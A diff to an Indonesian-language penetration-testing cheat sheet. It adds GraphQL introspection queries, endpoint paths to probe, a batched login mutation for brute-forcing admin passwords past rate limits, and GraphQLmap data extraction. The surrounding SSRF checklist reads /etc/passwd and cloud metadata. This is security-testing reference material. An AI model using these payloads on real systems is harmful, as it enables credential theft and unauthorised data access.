@@ -199,10 +199,59 @@ python3 ssrfmap.py -r request.txt -p url -m redis
 #   smtp, tomcat, zabbix, socksproxy, dll.
 ```
 
-### Test Checklist
+### Test Checklist SSRF
 
 1. Cek param `url`, `src`, `target`, `redirect`, `path`, `file`
 2. Blind SSRF: gunakan Burp Collaborator / interactsh
 3. Timing: `url=http://attacker.com/slow` → detect via latency
 4. Error-based: `file:///etc/passwd` → response beda
 5. Metadata: selalu test `169.254.169.254` (AWS/Azure/GCP)
+
+## GraphQL Konkret (Introspection + Batch)
+
+```bash
+# GraphQLmap: introspection
+python3 graphqlmap.py -u http://target/graphql -m introspection
+
+# atau manual: query __schema
+{"query":"{ __schema { types { name fields { name } } } }"}
+```
+
+### Endpoint Discovery
+
+```
+/graphql
+/graphiql
+/graphql/console/
+/graphql.php
+/graph
+/v1/graphql
+/api/graphql
+```
+
+### Batching Attack (Bypass Rate Limit)
+
+```json
+[
+  {"query": "mutation { login(user:\"admin\", pass:\"password1\") }"},
+  {"query": "mutation { login(user:\"admin\", pass:\"password2\") }"},
+  {"query": "mutation { login(user:\"admin\", pass:\"password3\") }"}
+]
+```
+
+Batch kirim N password dalam 1 request → bypass rate limit.
+
+### GraphQLmap (Scripting Engine)
+
+```bash
+# Field suggestion (introspection off)
+python3 graphqlmap.py -u http://target/graphql -m suggest
+
+# Extract data
+python3 graphqlmap.py -u http://target/graphql
+# GraphQLmap> { user { id email password } }
+```
+---
+
+audited
+---
